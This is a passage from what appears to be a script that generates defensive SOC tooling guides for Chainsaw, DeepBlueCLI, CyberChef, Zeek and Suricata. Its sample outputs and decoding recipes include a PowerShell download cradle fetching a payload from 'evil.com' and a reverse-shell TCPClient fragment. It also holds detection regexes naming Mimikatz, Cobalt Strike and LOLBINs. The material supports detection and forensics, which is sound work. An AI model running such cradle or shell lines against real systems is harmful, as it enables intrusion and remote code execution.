Invoke-WebRequest -Uri "https://github.com/WithSecureLabs/chainsaw/releases/latest/download/chainsaw_x86_64-pc-windows-msvc.zip" -OutFile chainsaw.zip
Expand-Archive chainsaw.zip -DestinationPath C:\Tools\Chainsaw

# Clone Sigma rules for use with Chainsaw
git clone https://github.com/SigmaHQ/sigma.git C:\Tools\sigma
```

## Core Usage

### Hunt with Sigma Rules

```bash
# Scan event logs with all bundled Sigma rules
chainsaw hunt C:\Windows\System32\winevt\Logs\ --sigma-rules ./sigma/rules/ --mapping ./mappings/sigma-event-logs-all.yml

# Scan with specific rule level (critical + high only)
chainsaw hunt /evidence/logs/ -s ./sigma/rules/ -m ./mappings/sigma-event-logs-all.yml --level critical,high

# Output results as JSON for SIEM ingestion
chainsaw hunt /evidence/logs/ -s ./sigma/rules/ -m ./mappings/sigma-event-logs-all.yml --json -o results.json

# Output as CSV
chainsaw hunt /evidence/logs/ -s ./sigma/rules/ -m ./mappings/sigma-event-logs-all.yml --csv -o results.csv
```

### Search for Specific Patterns

```bash
# Search for a keyword across all event logs
chainsaw search "mimikatz" C:\Windows\System32\winevt\Logs\

# Search with regex
chainsaw search -e "powershell.*-enc.*[A-Za-z0-9+/=]{50,}" /evidence/logs/

# Search specific event IDs
chainsaw search --event-id 4624 /evidence/logs/Security.evtx

# Search with timestamp filter
chainsaw search "lateral" /evidence/logs/ --from "2025-01-15T00:00:00" --to "2025-01-16T00:00:00"
```

### Dump Events

```bash
# Dump all events from a specific log
chainsaw dump /evidence/logs/Security.evtx

# Dump with JSON output
chainsaw dump /evidence/logs/Sysmon.evtx --json -o sysmon_dump.json

# Dump specific event IDs
chainsaw dump /evidence/logs/Security.evtx --event-id 4688,4689
```

## Real Investigation Example

### Scenario: Post-Breach Event Log Analysis

```bash
# Step 1: Run full Sigma scan on collected evidence
chainsaw hunt E:\Case001\Logs\ \
  --sigma-rules ./sigma/rules/windows/ \
  --mapping ./mappings/sigma-event-logs-all.yml \
  --level critical,high,medium \
  --csv -o E:\Case001\Analysis\sigma_hits.csv

# Step 2: Search for known attacker tools
chainsaw search -e "cobalt|beacon|mimikatz|rubeus|sharp" E:\Case001\Logs\

# Step 3: Look for encoded PowerShell execution
chainsaw search -e "powershell.*(-e |encodedcommand)" E:\Case001\Logs\ -i

# Step 4: Check for credential access events
chainsaw search --event-id 4648,4672,4768,4769 E:\Case001\Logs\Security.evtx

# Step 5: Look for lateral movement indicators
chainsaw search --event-id 4624,4625 E:\Case001\Logs\Security.evtx | grep "LogonType.*3\|LogonType.*10"
```

### Scenario: Detecting Living-off-the-Land Techniques

```bash
# Search for suspicious LOLBIN execution
chainsaw search -e "mshta|wmic|certutil|bitsadmin|msbuild|regsvr32" E:\Case001\Logs\

# Detect suspicious service installations (Event ID 7045)
chainsaw search --event-id 7045 E:\Case001\Logs\System.evtx

# Find WMI activity
chainsaw search -e "wmi|winmgmt" E:\Case001\Logs\
```

## Custom Sigma Rules with Chainsaw

```yaml
# Save as custom_rules/detect_psexec_service.yml
title: PsExec Service Installation
status: stable
level: high
logsource:
    product: windows
    service: system
detection:
    selection:
        EventID: 7045
        ServiceName|contains:
            - 'PSEXE'
            - 'psexec'
    condition: selection
tags:
    - attack.lateral_movement
    - attack.t1570
    - attack.t1021.002
```

```bash
# Run with your custom rules alongside Sigma
chainsaw hunt /evidence/logs/ \
  --sigma-rules ./sigma/rules/,./custom_rules/ \
  --mapping ./mappings/sigma-event-logs-all.yml
```

## Integration with SOC Workflow

### Batch Processing Script

```bash
#!/bin/bash
# triage_scan.sh - Automated Chainsaw triage
EVIDENCE_DIR="$1"
OUTPUT_DIR="$2"

mkdir -p "$OUTPUT_DIR"

echo "[*] Running Sigma hunt..."
chainsaw hunt "$EVIDENCE_DIR" \
  -s ./sigma/rules/windows/ \
  -m ./mappings/sigma-event-logs-all.yml \
  --csv -o "$OUTPUT_DIR/sigma_results.csv"

echo "[*] Searching for IOCs..."
while IFS= read -r ioc; do
  chainsaw search "$ioc" "$EVIDENCE_DIR" >> "$OUTPUT_DIR/ioc_hits.txt"
done < ioc_list.txt

echo "[*] Dumping key event IDs..."
for evtx in "$EVIDENCE_DIR"/*.evtx; do
  chainsaw dump "$evtx" --json >> "$OUTPUT_DIR/full_dump.json"
done

echo "[+] Triage complete. Results in $OUTPUT_DIR"
```

### Combining with Timeline Tools

```bash
# Export Chainsaw results, merge with KAPE timeline
chainsaw hunt /evidence/logs/ -s ./sigma/rules/ \
  -m ./mappings/sigma-event-logs-all.yml \
  --json -o sigma_hits.json

# Convert to timeline format and merge
jq -r '.[] | [.timestamp, .level, .name, .Event.System.EventID] | @csv' \
  sigma_hits.json >> master_timeline.csv
```

## Chainsaw vs Other Tools

| Feature | Chainsaw | EvtxECmd | Hayabusa |
|---|---|---|---|
| Sigma support | Native | No | Native |
| Speed | Fast | Fast | Very Fast |
| Output formats | JSON, CSV, text | CSV | JSON, CSV |
| Custom rules | Sigma YAML | N/A | Sigma + custom |
| Timeline | Basic | Yes | Yes |
| Best for | Quick Sigma scanning | Detailed parsing | Large-scale hunting |

## Best Practices

1. **Keep Sigma rules updated** - pull the latest from the SigmaHQ repository weekly
2. **Start with high/critical** levels to reduce noise, then expand as needed
3. **Combine with keyword search** - Sigma rules may not catch custom attacker tools
4. **Export to JSON** for downstream processing in your SIEM or analysis notebook
5. **Build a library of custom rules** specific to your environment
6. **Validate findings** against known baselines before escalating

## Further Reading

- Chainsaw GitHub: https://github.com/WithSecureLabs/chainsaw
- Sigma rules repository: https://github.com/SigmaHQ/sigma
- WithSecure labs blog: https://labs.withsecure.com/
"""
    ))

    # -------------------------------------------------------------------------
    # 4. DeepBlueCLI PowerShell Log Analysis
    # -------------------------------------------------------------------------
    articles.append((
        "DeepBlueCLI PowerShell Log Analysis",
        ["tooling", "deepbluecli", "powershell", "windows", "event-logs", "detection"],
        r"""# DeepBlueCLI PowerShell Log Analysis

## Overview

DeepBlueCLI is a PowerShell module created by Eric Conrad (SANS) that detects
specific attack techniques in Windows Event Logs. Unlike generic log parsers,
DeepBlueCLI contains purpose-built detection logic for common adversary behaviors
including command obfuscation, suspicious service creation, password attacks,
and PowerShell abuse.

## Why It Matters

| Capability | SOC Benefit |
|---|---|
| Attack-specific detection | Catches obfuscation, encoding, and evasion |
| No infrastructure needed | Runs directly on endpoints with PowerShell |
| Opinionated analysis | Provides severity and attack context |
| Multiple log sources | Security, System, Sysmon, PowerShell logs |
| Offline capable | Analyze exported .evtx files |

**MITRE ATT&CK Relevance:** Particularly effective at detecting T1059.001
(PowerShell), T1027 (Obfuscated Files), T1543.003 (Windows Service), T1110
(Brute Force), T1136 (Create Account), T1098 (Account Manipulation).

## Installation

```powershell
# Clone from GitHub
git clone https://github.com/sans-blue-team/DeepBlueCLI.git C:\Tools\DeepBlueCLI

# Or download directly
Invoke-WebRequest -Uri "https://github.com/sans-blue-team/DeepBlueCLI/archive/refs/heads/master.zip" `
  -OutFile DeepBlueCLI.zip
Expand-Archive DeepBlueCLI.zip -DestinationPath C:\Tools\

# Navigate to the tool
cd C:\Tools\DeepBlueCLI

# Allow script execution if needed
Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process
```

## Core Usage

### Analyzing Live Event Logs

```powershell
# Analyze Security log on local system
.\DeepBlue.ps1 -Log Security

# Analyze System log
.\DeepBlue.ps1 -Log System

# Analyze Sysmon log
.\DeepBlue.ps1 -Log "Microsoft-Windows-Sysmon/Operational"

# Analyze PowerShell operational log
.\DeepBlue.ps1 -Log "Microsoft-Windows-PowerShell/Operational"
```

### Analyzing Exported .evtx Files

```powershell
# Analyze an exported Security log
.\DeepBlue.ps1 .\evtx\security.evtx

# Analyze multiple files
Get-ChildItem .\evidence\*.evtx | ForEach-Object {
    Write-Host "`n=== Analyzing $($_.Name) ===" -ForegroundColor Cyan
    .\DeepBlue.ps1 $_.FullName
}

# Export results to CSV
.\DeepBlue.ps1 .\evtx\security.evtx | Export-Csv -Path results.csv -NoTypeInformation
```

### What DeepBlueCLI Detects

| Detection Category | Event IDs Used | Description |
|---|---|---|
| Password spray / brute force | 4625, 4648 | Multiple failed logons from one source |
| Password guessing | 4625 | Sequential failed logons to one account |
| Suspicious account creation | 4720 | New user accounts with admin indicators |
| Suspicious service creation | 7045 | Services with encoded commands or unusual paths |
| PowerShell obfuscation | 4104 | Encoded commands, concatenation, tick marks |
| PowerShell download cradles | 4104 | Net.WebClient, IEX, Invoke-Expression patterns |
| Suspicious command line | 4688 | Long command lines, unusual executables |
| LOLBIN usage | 4688 | certutil, mshta, regsvr32 abuse |
| Event log clearing | 1102, 104 | Security or System log cleared |
| Mimikatz indicators | 4688, 4104 | Known Mimikatz command patterns |

## Real Investigation Example

### Scenario: Detecting PowerShell Attack Chain

```powershell
# Run DeepBlueCLI against PowerShell operational log
.\DeepBlue.ps1 -Log "Microsoft-Windows-PowerShell/Operational"

# Sample output:
# Date    : 2025-03-15 14:23:45
# Log     : Microsoft-Windows-PowerShell/Operational
# EventID : 4104
# Message : Suspicious PowerShell - Encoded command
# Results : Base64-encoded command detected
#           Decoded: IEX(New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')
# Command : powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGUAdwA...
# Regex   : encoded

# Step 2: Cross-reference with Security log
.\DeepBlue.ps1 .\evidence\Security.evtx | Where-Object {
    $_.Date -gt "2025-03-15 14:00" -and $_.Date -lt "2025-03-15 15:00"
}
```

### Scenario: Brute Force Detection

```powershell
# Analyze Security log for authentication attacks
.\DeepBlue.ps1 -Log Security

# Sample output:
# Date    : 2025-03-14 02:15:00
# Log     : Security
# EventID : 4625
# Message : Password spray attack detected
# Results : 47 failed logons from 10.1.2.50
#           Target accounts: admin, administrator, svc_backup, svc_sql
#           Time window: 120 seconds
# Command :
# Regex   : passwordspray
```

### Scenario: Service-Based Persistence

```powershell
# Check System log for malicious services
.\DeepBlue.ps1 .\evidence\System.evtx

# Sample output:
# Date    : 2025-03-15 14:25:12
# Log     : System
# EventID : 7045
# Message : Suspicious service creation
# Results : Service: WindowsUpdateHelper
#           Command: cmd.exe /c powershell.exe -enc JABjAGwAaQBlAG4...
#           Encoded command in service binary path
# Command : cmd.exe /c powershell.exe -enc JABjAGwAaQBlAG4...
# Regex   : encodedservice
```

## Extending DeepBlueCLI

### Adding Custom Detections

```powershell
# DeepBlueCLI uses regex patterns in its detection logic
# You can add patterns to the regexes.csv file:

# regexes.csv format:
# Name,Regex,EventID,Log,Message,Severity
"CustomMalware","evil\.exe|malware\.dll","4688","Security","Known malware executable detected","High"
"SuspiciousPath","C:\\Temp\\[a-z]{8}\.exe","4688","Security","Randomly named executable in Temp","Medium"
```

## Integration with SOC Workflow

### Automated Analysis Pipeline

```powershell
# automated_deepblue.ps1
param(
    [string]$EvidenceDir,
    [string]$OutputDir
)

$logs = @(
    @{Name="Security"; Path="Security.evtx"},
    @{Name="System"; Path="System.evtx"},
    @{Name="PowerShell"; Path="Microsoft-Windows-PowerShell%4Operational.evtx"},
    @{Name="Sysmon"; Path="Microsoft-Windows-Sysmon%4Operational.evtx"}
)

foreach ($log in $logs) {
    $evtxPath = Join-Path $EvidenceDir $log.Path
    if (Test-Path $evtxPath) {
        Write-Host "[*] Analyzing $($log.Name)..." -ForegroundColor Yellow
        $results = & .\DeepBlue.ps1 $evtxPath
        $results | Export-Csv (Join-Path $OutputDir "$($log.Name)_deepblue.csv") -NoTypeInformation
        $highSev = $results | Where-Object { $_.Message -match "attack|suspicious|encoded" }
        if ($highSev) {
            Write-Host "[!] $($highSev.Count) high-severity findings in $($log.Name)" -ForegroundColor Red
        }
    }
}
```

### Forward Findings to SIEM

```powershell
# Convert DeepBlueCLI output to JSON and send to Elasticsearch
$results = .\DeepBlue.ps1 -Log Security
$results | ForEach-Object {
    $json = $_ | ConvertTo-Json -Compress
    Invoke-RestMethod -Uri "http://127.0.0.1:9200/deepblue-alerts/_doc" `
      -Method POST -Body $json -ContentType "application/json"
}
```

## Best Practices

1. **Run against all four log sources** (Security, System, PowerShell, Sysmon)
2. **Enable PowerShell Script Block Logging** (GPO) to maximize detection coverage
3. **Enable Process Creation Auditing** with command-line logging (Event ID 4688)
4. **Combine with Chainsaw** - DeepBlueCLI for targeted detection, Chainsaw for Sigma breadth
5. **Schedule regular scans** on critical servers (daily cron/scheduled task)
6. **Export results to your case management** system for tracking

## Further Reading

- DeepBlueCLI GitHub: https://github.com/sans-blue-team/DeepBlueCLI
- SANS SEC504 course materials (Eric Conrad)
- PowerShell logging best practices: https://www.mandiant.com/resources/blog/greater-visibility
"""
    ))

    # -------------------------------------------------------------------------
    # 5. CyberChef Recipes for SOC Analysts
    # -------------------------------------------------------------------------
    articles.append((
        "CyberChef Recipes for SOC Analysts",
        ["tooling", "cyberchef", "decoding", "analysis", "soc", "encoding"],
        r"""# CyberChef Recipes for SOC Analysts

## Overview

CyberChef is GCHQ's open-source web application for data transformation, encoding,
decoding, encryption, and analysis. Often called "the Cyber Swiss Army Knife," it
provides a drag-and-drop interface for chaining operations into recipes. For SOC
analysts, CyberChef is indispensable for quickly decoding obfuscated payloads,
extracting IOCs, and analyzing suspicious data during investigations.

## Why It Matters

| Capability | SOC Benefit |
|---|---|
| Base64 / hex decoding | Deobfuscate attacker payloads instantly |
| Regex extraction | Pull IPs, URLs, domains, hashes from raw data |
| XOR / encryption | Decode simple C2 communications |
| Defanging / refanging | Safe IOC handling for reports and tickets |
| Recipe chaining | Multi-step decoding in one operation |

**MITRE ATT&CK Relevance:** Essential for analyzing T1027 (Obfuscated Files),
T1059 (Command and Scripting Interpreter), T1132 (Data Encoding in C2),
T1140 (Deobfuscate/Decode Files or Information).

## Installation and Access

```bash
# Option 1: Use the hosted version
# https://gchq.github.io/CyberChef/

# Option 2: Self-host (Docker)
docker run -d -p 8080:8080 ghcr.io/gchq/cyberchef:latest

# Option 3: Download static build
wget https://github.com/gchq/CyberChef/releases/latest/download/CyberChef.zip
unzip CyberChef.zip -d /opt/cyberchef
# Open CyberChef.html in a browser (works offline)

# Option 4: Node.js CLI
npm install -g cyberchef
```

## Essential Recipes

### 1. Decode Base64 PowerShell Commands

When you encounter `powershell -enc <base64>`:

```
Recipe:
  From Base64 -> Decode Text (UTF-16LE)

Input:  SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGUAdgBpAGwALgBjAG8AbQAvAHAAYQB5AGwAbwBhAGQAJwApAA==
Output: IEX(New-Object Net.WebClient).DownloadString('http://evil.com/payload')
```

### 2. Extract IOCs from Raw Text

```
Recipe:
  Extract IP Addresses -> Sort -> Unique

Recipe (URLs):
  Extract URLs -> Defang URL

Recipe (Hashes):
  Regular Expression (User defined: [a-fA-F0-9]{32,64}) -> Sort -> Unique
```

### 3. Decode Hex-Encoded Payloads

```
Recipe:
  From Hex -> Strings (minimum length: 4)

Input:  4d5a90000300000004000000ffff0000
Output: MZ (PE header detected)
```

### 4. XOR Brute Force

```
Recipe:
  XOR Brute Force (key length: 1, null preserving: true)

Common use: Decoding single-byte XOR malware strings
```

### 5. Defang IOCs for Safe Sharing

```
Recipe:
  Defang URL

Input:  http://malicious-domain.com/payload.exe
Output: hxxp://malicious-domain[.]com/payload[.]exe

Recipe (IPs):
  Defang IP Addresses

Input:  192.168.1.100
Output: 192[.]168[.]1[.]100
```

### 6. Decode URL-Encoded Strings

```
Recipe:
  URL Decode

Input:  %70%6f%77%65%72%73%68%65%6c%6c%20%2d%65%6e%63
Output: powershell -enc
```

### 7. Analyze Timestamps

```
Recipe:
  Windows Filetime to UNIX Timestamp -> From UNIX Timestamp

Input:  132537408000000000
Output: 2025-01-15 00:00:00 UTC

Recipe (LDAP/AD timestamps):
  Translate DateTime Format (From: Microsoft LDAP, To: ISO 8601)
```

### 8. Entropy Analysis for Packed/Encrypted Data

```
Recipe:
  Entropy -> Frequency Distribution

High entropy (>7.5) suggests encryption or packing
Normal text entropy is typically 3.5-5.0
```

## Advanced Recipes

### Decode Multi-Layer Obfuscation

```
Recipe (Base64 -> Gunzip -> Strings):
  From Base64 -> Gunzip -> Strings (minimum: 4, encoding: All)

Use case: Malware droppers often base64-encode gzipped payloads
```

### Extract and Decode JWT Tokens

```
Recipe:
  Split (delimiter: .) -> From Base64 (alphabet: URL safe) -> JSON Beautify

Input: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIn0.Gfx6VO9tcxwk6xqx9yYzSfebfeakRqKkxt75ItonBS0
```

### Decode Emotet/QBot Encoded Config

```
Recipe:
  From Base64 -> XOR (key: hex, value: deadbeef) -> Strings

Adjust XOR key based on malware family analysis
```

### Parse Windows Event Log XML

```
Recipe:
  XML Beautify -> XPath Expression (//EventData/Data)

Use case: Quick parsing of raw event log XML exports
```

## Real Investigation Example

### Scenario: Phishing Email Analysis

```
Step 1: Extract URLs from email body
  Recipe: Extract URLs -> Defang URL
  Result: hxxps://login-verify[.]evil[.]com/auth?token=abc123

Step 2: Decode the base64 attachment
  Recipe: From Base64 -> Detect File Type
  Result: application/vnd.ms-office (malicious macro document)

Step 3: Extract macro strings
  Recipe: From Base64 -> Strings (min: 8) -> Filter (regex: http|cmd|powershell|wscript)
  Result: cmd.exe /c powershell -enc JABjAGwA...

Step 4: Decode the PowerShell payload
  Recipe: Regular Expression (extract base64) -> From Base64 -> Decode Text (UTF-16LE)
  Result: $client = New-Object Net.Sockets.TCPClient("10.0.0.5", 4444)
```

### Scenario: Suspicious DNS Query Analysis

```
Step 1: Decode hex-encoded DNS subdomain
  Recipe: From Hex
  Input:  7365637265742d646174612d657866696c
  Result: secret-data-exfil

Step 2: Analyze for data exfiltration patterns
  Recipe: From Base64 (if base64 subdomain) -> Detect File Type
```

## Bookmarkable Recipe URLs

CyberChef recipes can be saved as URLs for team sharing:

```
# Base64 decode PowerShell
https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)Decode_text('UTF-16LE%20(1200)')

# Extract all IOCs
https://gchq.github.io/CyberChef/#recipe=Extract_IP_addresses(false,false,false)Extract_URLs(false,false)Extract_email_addresses(false)

# Defang for reporting
https://gchq.github.io/CyberChef/#recipe=Defang_URL(true,true,true,'Valid%20domains%20and%20full%20URLs')Defang_IP_Addresses()
```

## CyberChef CLI Usage

```bash
# Using the npm CLI version
echo "SGVsbG8gV29ybGQ=" | npx cyberchef-cli -r "From_Base64"

# Pipe from other tools
cat suspicious_payload.bin | npx cyberchef-cli -r "To_Hex('Space',0)" | head -20
```

## Quick Reference: Common Operations

| Task | Operation(s) |
|---|---|
| Decode Base64 | From Base64 |
| Decode PowerShell -enc | From Base64 + Decode Text (UTF-16LE) |
| Decode hex | From Hex |
| URL decode | URL Decode |
| HTML entity decode | From HTML Entity |
| XOR decode | XOR (with key) |
| ROT13 | ROT13 |
| Extract IPs | Extract IP Addresses |
| Extract URLs | Extract URLs |
| Extract hashes | Regex: [a-fA-F0-9]{32,64} |
| File type detection | Detect File Type |
| Entropy check | Entropy |
| Defang IOCs | Defang URL / Defang IP |
| Timestamp convert | Windows Filetime / UNIX Timestamp |
| JSON format | JSON Beautify |

## Best Practices

1. **Bookmark your most-used recipes** as browser bookmarks with the recipe URL
2. **Self-host CyberChef** on your SOC network for air-gapped analysis
3. **Never paste sensitive data** into the public hosted version
4. **Chain operations** - most real-world analysis requires 3-5 steps
5. **Use the Magic operation** when you are unsure of encoding - it auto-detects
6. **Share recipes** with your team via the save/load recipe feature

## Further Reading

- CyberChef GitHub: https://github.com/gchq/CyberChef
- CyberChef hosted: https://gchq.github.io/CyberChef/
- Recipe collection: https://github.com/mattnotmax/cyberchef-recipes
"""
    ))

    # -------------------------------------------------------------------------
    # 6. Zeek (Bro) Network Monitoring Setup and Log Analysis
    # -------------------------------------------------------------------------
    articles.append((
        "Zeek (Bro) Network Monitoring Setup and Log Analysis",
        ["tooling", "zeek", "bro", "network", "monitoring", "nta", "traffic-analysis"],
        r"""# Zeek (Bro) Network Monitoring Setup and Log Analysis

## Overview

Zeek (formerly Bro) is a powerful open-source network analysis framework that
operates as a passive traffic analyzer. Unlike traditional IDS tools that focus
on signature matching, Zeek generates comprehensive structured logs describing
network activity - connections, DNS queries, HTTP transactions, SSL certificates,
file transfers, and more. It is a cornerstone of network security monitoring.

## Why It Matters

| Capability | SOC Benefit |
|---|---|
| Protocol parsing | Deep inspection of 40+ protocols |
| Structured logs | Machine-parseable logs for SIEM ingestion |
| Connection tracking | Full conn.log with duration, bytes, state |
| File extraction | Automatic extraction of transferred files |
| Custom scripting | Zeek scripting language for custom detections |
| TLS inspection | Certificate logging without decryption |

**MITRE ATT&CK Relevance:** Zeek excels at detecting T1071 (Application Layer
Protocol), T1573 (Encrypted Channel), T1041 (Exfiltration Over C2), T1105
(Ingress Tool Transfer), T1568 (Dynamic Resolution), T1572 (Protocol Tunneling).

## Installation

### Ubuntu/Debian

```bash
# Add Zeek repository
echo "deb http://download.opensuse.org/repositories/security:/zeek/xUbuntu_22.04/ /" | \
  sudo tee /etc/apt/sources.list.d/zeek.list
curl -fsSL https://download.opensuse.org/repositories/security:/zeek/xUbuntu_22.04/Release.key | \
  gpg --dearmor | sudo tee /etc/apt/trusted.gpg.d/zeek.gpg > /dev/null
sudo apt update && sudo apt install -y zeek

# Add Zeek to PATH
echo 'export PATH=/opt/zeek/bin:$PATH' >> ~/.bashrc
source ~/.bashrc
```

### Docker

```yaml
# docker-compose.yml
version: "3"
services:
  zeek:
    image: zeek/zeek:latest
    network_mode: host
    volumes:
      - ./logs:/opt/zeek/logs
      - ./site:/opt/zeek/share/zeek/site
    command: zeek -i eth0 local
```

### Configuration

```bash
# Edit node.cfg for your network interface
sudo vi /opt/zeek/etc/node.cfg

# node.cfg content:
[zeek]
type=standalone
host=localhost
interface=eth0    # Change to your capture interface

# Edit networks.cfg to define local subnets
sudo vi /opt/zeek/etc/networks.cfg

# networks.cfg:
10.0.0.0/8       Private
172.16.0.0/12    Private
192.168.0.0/16   Private

# Deploy configuration and start
sudo zeekctl deploy
```

## Core Log Files

| Log File | Contents | Key Fields |
|---|---|---|
| conn.log | All connections | uid, orig_h, resp_h, resp_p, proto, duration, bytes |
| dns.log | DNS queries/responses | query, qtype, answers, TTL |
| http.log | HTTP transactions | method, host, uri, status_code, user_agent |
| ssl.log | TLS handshakes | server_name, subject, issuer, validation |
| files.log | File transfers | filename, mime_type, md5, sha1, source |
| x509.log | Certificates | CN, SAN, issuer, expiry |
| smtp.log | Email activity | from, to, subject, path |
| notice.log | Zeek-generated alerts | note, msg, src, dst |
| weird.log | Protocol anomalies | name, addl, peer |

## Core Usage

### Reading PCAP Files

```bash
# Analyze a packet capture offline
zeek -r capture.pcap local

# This generates log files in the current directory
ls *.log
# conn.log  dns.log  http.log  ssl.log  files.log  ...

# Use zeek-cut to extract specific fields
cat conn.log | zeek-cut id.orig_h id.resp_h id.resp_p proto duration orig_bytes resp_bytes

# Filter DNS queries
cat dns.log | zeek-cut query answers | sort | uniq -c | sort -rn | head -20
```

### Live Capture

```bash
# Start Zeek on an interface
sudo zeek -i eth0 local

# Or use zeekctl for managed deployment
sudo zeekctl deploy
sudo zeekctl status
sudo zeekctl stop
```

### Useful zeek-cut Queries

```bash
# Top talkers by bytes
cat conn.log | zeek-cut id.orig_h orig_bytes | \
  awk '{arr[$1]+=$2} END {for (i in arr) print arr[i], i}' | sort -rn | head -20

# Long-duration connections (potential C2 beacons)
cat conn.log | zeek-cut id.orig_h id.resp_h id.resp_p duration | \
  awk '$4 > 3600' | sort -t$'\t' -k4 -rn

# DNS queries to unusual TLDs
cat dns.log | zeek-cut query | grep -E '\.(xyz|top|club|buzz|tk|ml|ga|cf)$' | sort | uniq -c | sort -rn

# HTTP downloads of executables
cat http.log | zeek-cut host uri resp_mime_types | grep "application/x-dosexec"

# Self-signed or expired certificates
cat ssl.log | zeek-cut server_name validation_status | grep -v "ok"
```

## Real Investigation Example

### Scenario: C2 Beacon Detection

```bash
# Step 1: Find long-lived connections
cat conn.log | zeek-cut id.orig_h id.resp_h id.resp_p duration proto | \
  awk '$4 > 7200 && $5 == "tcp"' | sort -t$'\t' -k4 -rn

# Step 2: Check DNS for suspicious domains
cat dns.log | zeek-cut ts query answers | grep "suspicious-domain.xyz"

# Step 3: Examine SSL connections to that IP
cat ssl.log | zeek-cut server_name subject issuer | grep "10.0.0.50"

# Step 4: Look for periodic connections (beaconing)
cat conn.log | zeek-cut ts id.orig_h id.resp_h id.resp_p | \
  grep "203.0.113.50" | awk '{print $1}' | \
  awk 'NR>1{print $1-prev}{prev=$1}'
# Regular intervals suggest beaconing
```

### Scenario: Data Exfiltration via DNS

```bash
# Find high-entropy DNS queries (potential DNS tunneling)
cat dns.log | zeek-cut query | awk '{if (length($1) > 60) print length($1), $1}' | sort -rn

# Count queries per unique subdomain base
cat dns.log | zeek-cut query | awk -F. '{print $(NF-1)"."$NF}' | sort | uniq -c | sort -rn | head -20

# Look for TXT record queries (common in DNS exfil)
cat dns.log | zeek-cut query qtype | grep "TXT"
```

## Custom Zeek Scripts

```zeek
# detect_long_connections.zeek
@load base/protocols/conn

event connection_state_remove(c: connection)
{
    if ( c$duration > 4hr && c$id$resp_p == 443/tcp )
    {
        NOTICE([
            $note=Weird::Activity,
            $conn=c,
            $msg=fmt("Long-lived TLS connection: %s -> %s:%s duration=%s",
                      c$id$orig_h, c$id$resp_h, c$id$resp_p, c$duration),
            $identifier=cat(c$id$orig_h, c$id$resp_h)
        ]);
    }
}
```

## Integration with SOC Workflow

```bash
# Forward Zeek logs to Elasticsearch via Filebeat
# filebeat.yml snippet:
# filebeat.inputs:
#   - type: log
#     paths:
#       - /opt/zeek/logs/current/*.log
#     json.keys_under_root: true
#     json.add_error_key: true

# Or use Zeek's JSON output directly
# In local.zeek:
# @load policy/tuning/json-logs.zeek
```

## Best Practices

1. **Enable JSON log output** for easier SIEM ingestion
2. **Tune local.zeek** to define your internal networks accurately
3. **Monitor notice.log** for Zeek-generated alerts and anomalies
4. **Use file extraction** cautiously - it consumes significant disk space
5. **Rotate logs** with zeekctl or configure log rotation policies
6. **Baseline your network** before hunting - know what is normal

## Further Reading

- Zeek documentation: https://docs.zeek.org/
- Zeek scripting: https://docs.zeek.org/en/master/scripting/
- Corelight community: https://corelight.com/community
"""
    ))

    # -------------------------------------------------------------------------
    # 7. Suricata IDS Setup Rules and Alert Tuning
    # -------------------------------------------------------------------------
    articles.append((
        "Suricata IDS Setup Rules and Alert Tuning",
        ["tooling", "suricata", "ids", "ips", "network", "detection", "rules"],
        r"""# Suricata IDS Setup Rules and Alert Tuning

## Overview

Suricata is a high-performance open-source network threat detection engine capable
of real-time intrusion detection (IDS), inline intrusion prevention (IPS), network
security monitoring (NSM), and offline PCAP processing. It supports multi-threading,
making it significantly faster than legacy tools like Snort on modern hardware.

## Why It Matters

| Capability | SOC Benefit |
|---|---|
| Multi-threaded IDS/IPS | Line-rate inspection on high-bandwidth links |
| Signature + anomaly detection | Flexible detection approaches |
| Protocol parsing | HTTP, TLS, DNS, SMB, and more |
| File extraction | Pull files from network streams |
| EVE JSON logging | Structured output for SIEM ingestion |
| Lua scripting | Custom detection logic |

**MITRE ATT&CK Relevance:** Suricata detects T1071 (Application Layer Protocol),
T1190 (Exploit Public-Facing Application), T1105 (Ingress Tool Transfer),
T1572 (Protocol Tunneling), T1573 (Encrypted Channel anomalies via JA3).

## Installation

### Ubuntu/Debian

```bash
sudo apt install -y software-properties-common
sudo add-apt-repository ppa:oisf/suricata-stable
sudo apt update
sudo apt install -y suricata suricata-update

# Verify installation
suricata --build-info
suricata -V
```

### Docker

```yaml
version: "3"
services:
  suricata:
    image: jasonish/suricata:latest
    network_mode: host
    cap_add:
      - NET_ADMIN
      - SYS_NICE
    volumes:
      - ./etc:/etc/suricata
      - ./logs:/var/log/suricata
      - ./rules:/var/lib/suricata/rules
    command: -i eth0
```

### Initial Configuration

```yaml
# /etc/suricata/suricata.yaml (key sections)
vars:
  address-groups:
    HOME_NET: "[10.0.0.0/8,172.16.0.0/12,192.168.0.0/16]"
    EXTERNAL_NET: "!$HOME_NET"
    HTTP_SERVERS: "$HOME_NET"
    DNS_SERVERS: "$HOME_NET"
  port-groups:
    HTTP_PORTS: "80"
    SHELLCODE_PORTS: "!80"

af-packet:
  - interface: eth0
    threads: auto
    cluster-type: cluster_flow

outputs:
  - eve-log:
      enabled: yes
      filetype: regular
      filename: eve.json
      types:
        - alert:
            tagged-packets: yes
        - http:
            extended: yes
        - dns:
            query: yes
            answer: yes
        - tls:
            extended: yes
        - files:
            force-magic: yes
            force-hash: [md5, sha256]
        - flow
        - netflow
```

## Rule Management

### Using suricata-update

```bash
# Update rules from default sources (ET Open)
sudo suricata-update

# List available rule sources
sudo suricata-update list-sources

# Enable additional sources
sudo suricata-update enable-source oisf/trafficid
sudo suricata-update enable-source et/open
sudo suricata-update enable-source tgreen/hunting

# Update and reload
sudo suricata-update
sudo suricatasc -c reload-rules
```

### Rule Syntax

```
action protocol src_ip src_port -> dst_ip dst_port (options;)
```

```bash
# Example: Detect Cobalt Strike default certificate
alert tls $HOME_NET any -> $EXTERNAL_NET any (msg:"ET MALWARE Cobalt Strike Default TLS Certificate"; tls.subject:"CN=Major Cobalt Strike"; sid:2033469; rev:1;)

# Example: Detect PowerShell download cradle
